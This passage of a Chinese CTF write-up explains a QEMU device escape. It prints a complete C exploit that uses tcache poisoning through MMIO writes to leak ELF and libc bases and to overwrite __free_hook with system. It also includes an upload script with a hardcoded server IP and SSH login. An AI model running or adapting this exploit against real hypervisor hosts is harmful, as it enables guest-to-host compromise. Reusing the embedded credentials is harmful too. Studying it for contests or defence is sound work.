`heap_info`：
    typedef struct _heap_info
    {
      mstate ar_ptr; /* Arena for this heap. */
      struct _heap_info *prev; /* Previous heap. */
      size_t size;   /* Current size in bytes. */
      size_t mprotect_size; /* Size in bytes that has been mprotected
                               PROT_READ|PROT_WRITE.  */
      /* Make sure the following data is properly aligned, particularly
         that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of
         MALLOC_ALIGNMENT. */
      char pad[-6 * SIZE_SZ & MALLOC_ALIGN_MASK];
    } heap_info;
查看`malloc_state`结构体中内容：
发现从偏移`0x8c0`处`malloc_state`就已经结束，，接着是一个`0x255`的`chunk`，其是负责管理`tcache`的结构体：
然后到偏移`0xB10`处，`tcache`管理结构体结束，又是一个`0x98c5`的超大`chunk`，而那些`elfbase`就是存在于这个`chunk`中，但是我不知道他是用来做什么的以及那些`elf`的地址的意义代表什么：
发现了存在`elfbase`之后，就可以想办法将其泄露出来。
我们可以先确定一个程序使用率较低的`size`的`tcache`链来进行后续攻击，我这里选的是`0x400`这条链。先泄露出`thread_heap`的基址，然后`free`一个`size`为`0x400`的`fake_chunk`进入对应的`tcache`，然后用`case
2`去将这个`fake_chunk`的`fd`改为带有`elfbase`地址的`thread_heap`地址，我选的偏移是`0xBA0`。
形成如下结构：
    (0x400)   tcache_entry[62](2): fake_chunk --> thread_heap_start + 0xba0 --> elfbase + offset --> xxxxxxxx
然后调用两次`case 8`，一次`case 1`：
    (0x400)   tcache_entry[62](1): fake_chunk --> elfbase + offset --> xxxxxxxx
**但是要注意一点，我们需要在进行`leak
elfbase`之前要先布置好`tcache->counts[62]`，因为我们`malloc`的次数比`free`的次数要多，所以假如开始时`count`为1的话，那么在两次`malloc`之后会变为`255`，也就是`-1`，这时在那一次`case
1`的`free`中程序检测`tcache`已满，所以会去尝试放入`unsortedbin`中，导致报错，所以在最开始要先`free`两次`fake_chunk`将`tcache->counts[62]`调整为2。**
然后用`mmap64`的任意读读出`elfbase`地址。
有了`elfbase`之后，我们就可以用`GOT`表泄露`libcbase`，方法同上，注意点同上，要先将`tcache->counts[62]`调整为2。
#### hijack
有了`libcbase`之后，用一次任意地址分配+写去改`free_hook`为`system`，然后在`mmap64`处布置好`cat
/flag`字符串，调用`case 1`触发`free("cat /flag")`即可。
#### exp
加`getchar`是为了在调试时使`gdb`的信号接收不错位，比如你`exp`里先调用了`mmio_write`，后调用了`mmio_read`，然后在`mmio_read`和`mmio_write`的地址都下了断点，按`c`，会发现有时是先断在`mmio_read`的，可能是读的信号来的更快？？总之加了`getchar`就不会错位，`sleep(0.1)`应该也可以起到相同效果。
    #define _GNU_SOURCE
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    unsigned char* mmio_mem;
    void perr(char buf[]){
        puts(buf);
        exit(1);
    }
    void mmio_write(uint64_t addr, uint64_t value)
    {
        *((uint32_t*)(mmio_mem + addr)) = value;
    }
    uint64_t mmio_read(uint32_t addr)
    {
        return *((uint64_t*)(mmio_mem + addr));
    }
    int main(){
        setbuf(stdout,0);
        int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0",O_RDWR|O_SYNC);
        if (mmio_fd == -1)
            perr("[:(]mmio_fd open failed...");
        mmio_mem = mmap(0,0x100000,PROT_READ|PROT_WRITE,MAP_SHARED,mmio_fd,0);
        if (mmio_mem == MAP_FAILED)
            perr("[:(]mmap mmio_mem failed...");
        printf("[:)]mmio_mem = %p\n", mmio_mem);
        mmio_write(0x030008,0x400);
        getchar();
        mmio_write(0x010010,0);
        getchar();
        mmio_write(0x010010,0);
        getchar();
        mmio_write(0x010010,0);
        getchar();
        mmio_write(0x030408,0x290);
        getchar();
        mmio_write(0x010410,0);
        getchar();
        uint64_t thread_heap = mmio_read(0x060410);
        thread_heap &= 0xffffff000000;
        printf("[:)]thread_heap = %p\n",thread_heap);
        getchar();
        mmio_write(0x030010,thread_heap + 0xba0);
        getchar();
        mmio_write(0x030014,thread_heap >> 32);
        getchar();
        *((uint8_t*)(mmio_mem + 0x08007E)) = 0;
        getchar();
        *((uint8_t*)(mmio_mem + 0x08007E)) = 0;
        getchar();
        mmio_write(0x010010,0);
        getchar();
        uint64_t codebase = mmio_read(0x060010)-(0x5555567ae468-0x555555554000);
        printf("[:)]codebase = %p\n",codebase);
        uint64_t free_got = 0x1092330 + codebase;
        getchar();
        mmio_write(0x010010,0);
        getchar();
        mmio_write(0x030010,free_got);
        getchar();
        mmio_write(0x030014,free_got >> 32);
        getchar();
        *((uint8_t*)(mmio_mem + 0x08007E)) = 0;
        getchar();
        *((uint8_t*)(mmio_mem + 0x08007E)) = 0;
        getchar();
        mmio_write(0x010010,0);
        getchar();
        uint64_t libcbase = mmio_read(0x060010)-0x97950;
        printf("[:)]libcbase = %p\n",libcbase);
        uint64_t free_hook = libcbase + (0x7ffff41528e8-0x00007ffff3d65000);
        uint64_t system_addr = libcbase + (0x7ffff3db4440-0x00007ffff3d65000);
        getchar();
        mmio_write(0x030010,free_hook);
        getchar();
        mmio_write(0x030014,free_hook >> 32);
        getchar();
        *((uint8_t*)(mmio_mem + 0x08007E)) = 0;
        getchar();
        *((uint8_t*)(mmio_mem + 0x04007E)) = 0;
        getchar();
        *((uint64_t*)(mmio_mem + 0x070000)) = system_addr;
        getchar();
        mmio_write(0x030010,0x20746163);
        getchar();
        mmio_write(0x030014,0x616c662f); 
        getchar();
        mmio_write(0x030018,0x067); 
        getchar();
        mmio_write(0x010010,0);
        exit(0);
    }
    /*
    0x00007ffff3d65000 0x00007ffff3f4c000 r-xp      /lib/x86_64-linux-gnu/libc-2.27.so
    0x00007ffff3f4c000 0x00007ffff414c000 ---p      /lib/x86_64-linux-gnu/libc-2.27.so
    0x00007ffff414c000 0x00007ffff4150000 r--p      /lib/x86_64-linux-gnu/libc-2.27.so
    0x00007ffff4150000 0x00007ffff4152000 rw-p      /lib/x86_64-linux-gnu/libc-2.27.so
    gdb-peda$ p &__free_hook
    $1 = (void (**)(void *, const void *)) 0x7ffff41528e8 
    gdb-peda$ p &system     
    $2 = (int (*)(const char *)) 0x7ffff3db4440 
    */
#### upload
打远程需要上传写好的`exp`，一般流程是先用`musl-gcc`编译，然后`strip`，然后再传：
    musl-gcc myexp.c -Os -o myexp
    strip myexp
    python upload.py
`upload.py`：
    #coding:utf-8
    from pwn import *
    import commands
    HOST = "110.80.136.39"
    PORT =  22
    USER = "pwnvimu"
    PW = "pwnvimu2002"
    #context.log_level = 'debug'
    def exec_cmd(cmd):
        r.sendline(cmd)
        r.recvuntil("/ # ")
    def upload():
        p = log.progress("Upload")
        with open("myexp","rb") as f:
            data = f.read()
        encoded = base64.b64encode(data)
        r.recvuntil("/ # ")
        for i in range(0,len(encoded),1000):
            p.status("%d / %d" % (i,len(encoded)))
            exec_cmd("echo \"%s\" >> benc" % (encoded[i:i+1000]))
        exec_cmd("cat ./benc | base64 -d > ./bout")
        exec_cmd("chmod +x ./bout")
        log.success("success")
    def exploit(r):
        upload()
        r.interactive()
    local = 0
    if __name__ == "__main__":
        if local != 1:
            session = ssh(USER, HOST, PORT, PW)
            r = session.run("/bin/sh")
            exploit(r)
## 结语
做完以后回头看，是不是你也觉得这道题没有这么难，只是细节比较多。
目前我个人遇到的`qemu`设备方面的逃逸大体分为两种，一种是写了个自定义设备，然后存在漏洞，另一种是更改了其原有的设备，需要我们对比源码与寻找漏洞，且一般来说第二种难度会更大一点（当然并不意味着第一种就会很简单），`Kimu`貌似是属于第二种？
这也是我第一次在比赛中做出`qemu-escape`，比较开心，但是路还很长，需倍加努力。